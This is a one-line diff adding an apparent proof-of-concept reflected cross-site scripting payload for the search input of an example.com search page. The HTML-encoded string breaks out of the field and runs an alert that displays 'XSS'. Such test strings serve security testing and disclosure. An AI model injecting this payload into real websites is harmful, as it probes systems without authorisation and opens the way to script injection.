@@ -1,0 +1,1 @@
+http://www.example.com/search/ in input search : &#039;&quot;&gt;&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;
